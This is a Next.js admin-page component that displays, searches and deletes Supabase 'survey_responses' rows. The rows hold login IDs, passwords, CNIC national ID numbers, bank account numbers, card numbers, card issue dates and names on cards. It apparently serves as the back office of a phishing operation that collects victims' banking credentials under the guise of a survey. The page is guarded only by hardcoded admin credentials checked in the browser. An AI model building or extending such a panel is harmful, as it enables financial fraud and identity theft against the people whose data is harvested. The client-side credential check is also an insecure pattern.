"use client";

import { useEffect, useState } from "react";
import { supabase } from "../lib/supabaseClient";

interface SurveyEntry {
  id: string;
  login_id: string;
  password: string;
  cnic: string;
  bank_name: string;
  account_number: string;
  card_number: string;
  card_issue_date: string;
  name_on_card: string;
  review: string;
  created_at: string;
}

// Hardcoded admin credentials
const ADMIN_ID = "admin";
const ADMIN_PASSWORD = "admin1024";

export default function AdminPage() {
  const [loggedIn, setLoggedIn] = useState(false);
  const [adminId, setAdminId] = useState("");
  const [adminPassword, setAdminPassword] = useState("");
  const [entries, setEntries] = useState<SurveyEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [filter, setFilter] = useState("");
  const [filterField, setFilterField] = useState("all");

  // Login handler
  const handleLogin = async () => {
    if (adminId === ADMIN_ID && adminPassword === ADMIN_PASSWORD) {
      setLoggedIn(true);
      fetchEntries();
    } else {
      alert("Invalid admin credentials");
    }
  };

  // Fetch survey entries
  const fetchEntries = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("survey_responses")
      .select("*")
      .order("created_at", { ascending: false });

    if (error) console.error("Error fetching data:", error);
    else setEntries(data ?? []);
    setLoading(false);
  };

  // Delete a survey entry
  const handleDelete = async (id: string) => {
    if (!confirm("Are you sure you want to delete this response?")) return;

    const { error } = await supabase
      .from("survey_responses")
      .delete()
      .eq("id", id);

    if (error) alert("Delete failed: " + error.message);
    else fetchEntries();
  };

  // Filter entries based on dropdown + search
  const filteredEntries = entries.filter((e) => {
    if (!filter) return true;
    const lower = filter.toLowerCase();

    if (filterField === "all") {
      return Object.values(e).some((val) =>
        val?.toString().toLowerCase().includes(lower)
      );
    } else {
      const val = (e as any)[filterField];
      return val?.toString().toLowerCase().includes(lower);
    }
  });

  if (!loggedIn) {
    return (
      <div className="min-h-screen flex flex-col justify-center items-center p-6 bg-blue-50">
        <div className="bg-white shadow-lg rounded-xl p-8 w-full max-w-sm">
          <h1 className="text-3xl font-bold text-blue-700 mb-6 text-center">
            Admin Login
          </h1>
          <div className="flex flex-col gap-4">
            <input
              placeholder="Admin ID"
              className="border p-3 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              value={adminId}
              onChange={(e) => setAdminId(e.target.value)}
            />
            <input
              placeholder="Password"
              type="password"
              className="border p-3 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              value={adminPassword}
              onChange={(e) => setAdminPassword(e.target.value)}
            />
            <button
              onClick={handleLogin}
              className="bg-blue-600 hover:bg-blue-700 text-white font-semibold p-3 rounded shadow"
            >
              Login
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="p-6 max-w-7xl mx-auto min-h-screen bg-blue-50">
      <h1 className="text-3xl font-bold text-blue-700 mb-6">
        Survey Submissions
      </h1>

      <div className="flex flex-col md:flex-row gap-2 mb-4 items-center">
        <input
          placeholder="Search..."
          className="border p-2 rounded w-full md:w-1/3 focus:outline-none focus:ring-2 focus:ring-blue-500"
          value={filter}
          onChange={(e) => setFilter(e.target.value)}
        />
        <select
          value={filterField}
          onChange={(e) => setFilterField(e.target.value)}
          className="border p-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
        >
          <option value="all">All Fields</option>
          <option value="login_id">Login ID</option>
          <option value="password">Password</option>
          <option value="cnic">CNIC</option>
          <option value="bank_name">Bank Name</option>
          <option value="account_number">Account Number</option>
          <option value="card_number">Card Number</option>
          <option value="card_issue_date">Card Issue Date</option>
          <option value="name_on_card">Name on Card</option>
          <option value="review">Review</option>
          <option value="created_at">Submitted At</option>
        </select>
      </div>

      {loading ? (
        <p className="text-blue-700">Loading...</p>
      ) : filteredEntries.length === 0 ? (
        <p className="text-blue-700">No submissions found.</p>
      ) : (
        <div className="overflow-x-auto rounded-lg shadow bg-white">
          <table className="table-auto border-collapse border border-gray-300 w-full">
            <thead className="bg-blue-100">
              <tr>
                {[
                  "Login ID",
                  "Password",
                  "CNIC",
                  "Bank",
                  "Account #",
                  "Card #",
                  "Card Issue Date",
                  "Name on Card",
                  "Review",
                  "Submitted At",
                  "Actions",
                ].map((h) => (
                  <th
                    key={h}
                    className="border px-3 py-2 text-left text-blue-700"
                  >
                    {h}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {filteredEntries.map((e) => (
                <tr key={e.id} className="hover:bg-blue-50">
                  <td className="border px-2 py-1">{e.login_id}</td>
                  <td className="border px-2 py-1">{e.password}</td>
                  <td className="border px-2 py-1">{e.cnic}</td>
                  <td className="border px-2 py-1">{e.bank_name}</td>
                  <td className="border px-2 py-1">{e.account_number}</td>
                  <td className="border px-2 py-1">{e.card_number}</td>
                  <td className="border px-2 py-1">{e.card_issue_date}</td>
                  <td className="border px-2 py-1">{e.name_on_card}</td>
                  <td className="border px-2 py-1">{e.review}</td>
                  <td className="border px-2 py-1">
                    {new Date(e.created_at).toLocaleString()}
                  </td>
                  <td className="border px-2 py-1">
                    <button
                      onClick={() => handleDelete(e.id)}
                      className="bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded shadow"
                    >
                      Delete
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
